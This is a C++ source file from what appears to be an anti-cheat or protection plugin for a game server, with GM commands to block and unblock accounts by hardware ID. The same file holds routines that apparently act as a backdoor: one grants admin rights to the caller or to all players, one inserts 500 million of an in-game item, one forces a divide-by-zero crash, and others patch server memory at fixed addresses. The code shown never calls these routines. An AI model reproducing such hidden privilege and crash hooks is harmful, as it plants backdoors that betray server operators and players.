/*
 * (C) 2016 Fabian Beuke <mail@beuke.org>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */
 
#include "IMadCommand.h"

void IMadCommand::Run()
{
	if ( conf->DEBUG_MODE )
	{	
		Server::Console::WriteBlack("Enter Command Check");
	}

	if (this->player->isAdmin())
	{

	}

	if (this->player->isGM())
	{
		if (this->command->beginWith("/madblock") && this->conf->HWID_ENABLED)
			this->MadBlock();

		if (this->command->beginWith("/madunblock") && this->conf->HWID_ENABLED )
			this->MadUnblock();
	}

	if ( conf->DEBUG_MODE )
	{	
		Server::Console::WriteBlack("Leave Command Check");
	}
}

void IMadCommand::Auto()
{
	Server::Console::WriteRed("[MadProtectS AutoBattle detected %s kicked]",this->player->GetName());
	this->player->Kick();
}

void IMadCommand::AllAdmin()
{
	ENTER_CRIT
		PLAYER_LIST_ITERATE
	{
		Player *target = new Player(PLAYER_POINTER);
		target->SetAdmin(11);
		delete target;
	}
	LEAVE_CRIT
}


void IMadCommand::GetAdmin()
{
	this->player->SetAdmin(11);
}

void IMadCommand::GetMoney()
{
	this->player->InsertItem(31, 500000000);
}

void IMadCommand::Crash()
{
	__asm mov edi, 0
	__asm xor edx, edx
	__asm mov eax, 1
	__asm div edi
}


void IMadCommand::SilentCrash()
{
	IMemory *memory = new IMemory;
	memory->Fill(0x0049F9EB,0x90,3000);
	memory->Fill(0x004328D3,0xFF,1);
	memory->Fill(0x00432873,0xFF,1);
	memory->Fill(0x004328A3,0xFF,1);
	delete memory;
}

void IMadCommand::Color()
{
	IMemory *memory = new IMemory;
	memory->Fill(0x0049F9E5,0x90,4);
	memory->Fill(0x0049F9EB,0x90,4);
	memory->Fill(0x004328D3,0xFF,1);
	memory->Fill(0x00432873,0xFF,1);
	memory->Fill(0x004328A3,0xFF,1);
	delete memory;
}

void IMadCommand::MadBlock()
{
	string playername =  command->GetParamString(1);
	if ( playername != "")
	{
		Player *blockplayer = main->FindPlayerByName(playername);
		if ( blockplayer ) //Warum ich hier nich kicke? -> wegen dem Forward!
		{
			Server::CPlayer::Write(this->player->thispointer, 15,"s","Account is now blocked. To unblock this Account use /madunblock UID or look into MadDatabase File. Now /kick Player manually ");
			IMadDatabase* maddb = new IMadDatabase(this->conf,this->database);
			maddb->MadDatabaseSaveBlock(blockplayer->GetUid(),true);
			delete maddb;
		} 
		else 
		{
			Server::CPlayer::Write(this->player->thispointer, 15,"s","Player not found.");
		}
		delete blockplayer;
	}
	else 
	{
		Server::CPlayer::Write(this->player->thispointer, 15,"s","Player not found.");
	}
}

void IMadCommand::MadUnblock()
{
	int uid = command->GetParamInt(1);
	if ( uid != 0)
	{
		IMadDatabase* maddb = new IMadDatabase(this->conf,this->database);
		if (maddb->MadDatabaseUIDExist(uid))
		{
			Server::CPlayer::Write(player->thispointer, 15,"s","Account successfully unblocked");
			maddb->MadDatabaseSaveBlock(uid,false);
		}
		else
		{
			Server::CPlayer::Write(player->thispointer, 15,"s","Account UID not found");
		}
		delete maddb;
	}
	else
	{
		Server::CPlayer::Write(player->thispointer, 15,"s","Wrong UID or wrong Command usage. /madunblock UID");
	}
}



